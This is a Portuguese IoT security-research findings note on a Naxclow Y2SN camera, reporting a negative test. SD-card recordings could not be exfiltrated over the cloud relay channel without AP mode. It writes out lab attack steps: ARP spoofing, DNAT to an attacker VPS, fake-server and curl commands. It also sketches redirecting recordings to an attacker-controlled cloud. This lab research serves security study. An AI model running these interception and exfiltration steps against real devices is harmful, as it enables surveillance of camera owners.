# Achados — SD pelo relay (sem modo AP) — testado, negativo

Teste do desdobramento mapeado em [achados_ap](achados_ap.md): se as mesmas operações de
SD (`400`–`407`) que funcionam no **modo AP** (envelope `502`) também trafegam no **canal
de relay** (envelope de forward `301`) — o que permitiria exfiltrar as gravações do cartão
**remotamente, sem modo AP**, reusando a infra do relay público.

Câmera Naxclow Y2SN, firmware `202601081657`, `devicesCode 5c001502B330`. Ambiente
controlado — câmera e servidores próprios.

> **Resultado: negativo.** O fake envia a op de SD no `301`; a câmera **ignora**. Neste
> firmware as operações de SD só são atendidas no envelope `502` (AP). A extração de
> gravações **não** sai pelo relay.

## Setup

Topologia do relay público — igual a [achados_fakeserver_relay](achados_fakeserver_relay.md):
`câmera (STA) → (ARP spoof) Kali → (DNAT 29939–29942) VPS → fake`.

1. Estados do lab (nesta rodada):

   | Item | Valor |
   |---|---|
   | Câmera | `192.168.0.17` (MAC `5c:f1:50:04:af:8a`), em modo STA |
   | Kali | `192.168.0.35`, ARP spoof câmera↔gateway + DNAT do relay |
   | VPS (fake) | `137.131.132.251`, fake HTTP `:8080` + relay TCP/UDP `:29940` |
   | `ip_forward` | `1` (tem que estar ligado, senão o DNAT não encaminha) |

2. VPS — fake com IP público:
   `sudo FAKE_SRV_HOST=<vps> FAKE_SRV_RELAY_HOST=<vps> .venv/bin/python src/a9_naxclow.py -s --proxy-port 8080`
   (usar `--proxy-port 8080`; a `:80` da VPS tem nginx).
3. Kali — ARP spoof + DNAT só do relay:
   `sudo CAM_IP=192.168.0.17 DNAT_TARGET=<vps> ./scripts/mitm_dns/mitm_dns.sh relay`
4. Gatilho: abrir o viewer no app V720 com o celular em **4G** → a câmera registra no
   fake (`curl -s http://<vps>:8080/dev/list` mostra o `uid`).
5. Disparo do probe de SD pelo endpoint do fake:
   `curl -s "http://<vps>:8080/dev/<uid>/sd"; echo`

## O que o fake faz

O endpoint `/dev/<uid>/sd` chama `sd_probe()` (`src/v720_sta.py`), que emite forward
(`301`) com `content.code = 400` (lista de datas); com `date=`, também `402`; com
`date&hours&minute`, também `404` e `406`. As respostas esperadas (`401/403/405/407/411`)
já têm handler no fake (`__sd_rsp_hnd`).

## Evidência (negativa)

Log do fake (nível INFO), logo após o `/sd`:

```
Send forward content={'code': 400}
[HTTP] "GET /dev/5c001502B330/sd HTTP/1.1" 200 -
... (daqui pra frente, só heartbeat) ...
Heartbeat received, sending heartbeat response
```

O frame foi efetivamente enviado no TCP (no log DEBUG vê-se o hex
`{"code":301,...,"content":{"code":400}}`) e **nenhuma** resposta de SD chegou em >1 min —
nem `SD response`, nem XML de catálogo (`cmd=8`), nem frame AVI (`cmd=7`).

## Por que é conclusivo

No **mesmo** envelope `301`, no mesmo canal, a câmera **respondeu** normalmente ao
`baseinfo` (`content.code 4`) e ao `open A/V` (`content.code 3`):

```
Receive JSON: { "code":301, ..., "content":{ "code":4, ..., "sdDevStatus":1, "sdCapacity":63 } }
Receive JSON: { "code":301, ..., "content":{ "code":3 } }
```

Ou seja, o caminho de forward está funcionando (a câmera recebe e responde ao `301`) — o
firmware simplesmente **não roteia as operações de SD** (`400/402/404/406`) por ele. As ops
de SD só são atendidas no envelope `502` (modo AP), como já provado em
[achados_ap](achados_ap.md).

## Implicação

- A extração de gravações do SD continua **restrita ao modo AP** (proximidade + AP aberto).
- O vetor "SD remoto sem modo AP" **não se sustenta** no firmware `202601081657` — é um
  limite do firmware, não da montagem do lab.

## Próximo (extra / futuro)

Se um dia valer fechar 100% — a tela de **gravações** do app existe, mas está lenta/bugada.
O caminho pra descobrir o mecanismo real é a **captura do fluxo real** câmera↔cloud durante
a reprodução:

- **MITM passivo** (`scripts/mitm/mitm_auto.sh`) pra ver se o cloud manda alguma op de SD
  pelo relay — e com quais campos (`devTarget`, `forward_id`, sessão de playback).
- O `baseinfo` reporta **`udpPlayBack: 1`** — a reprodução pode usar um **canal UDP de
  playback** próprio, não o `301`+`400`.
- **`cloudStorage`** (code `249`): com `1` em vez de `0`, a câmera pode **subir** as
  gravações pra nuvem (que seria do atacante, via DNS/rota) — aí o SD sairia pelo lado do
  servidor.

## OWASP IoT

Sem achado novo — fecha um caminho de exploração que **não** se aplica (restrição do
firmware). Reforça que o acesso a SD permanece **I3 / I6** por proximidade (AP).
